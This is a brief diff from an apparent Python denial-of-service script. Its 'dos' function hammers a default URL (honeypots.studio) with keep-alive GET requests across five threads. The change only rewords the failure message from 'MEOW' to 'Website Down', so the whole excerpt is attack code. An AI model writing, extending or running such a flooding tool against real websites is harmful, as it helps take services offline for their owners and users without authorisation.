@@ -7,6 +7,6 @@ def dos(url = "http://www.honeypots.studio"):
         try:
             requests.get(url, headers={'Connection' : 'keep-alive'})
         except Exception:
-            print("MEOW")
+            print("Website Down")
 for _ in range(5):
 	threading.Thread(target=dos).start()
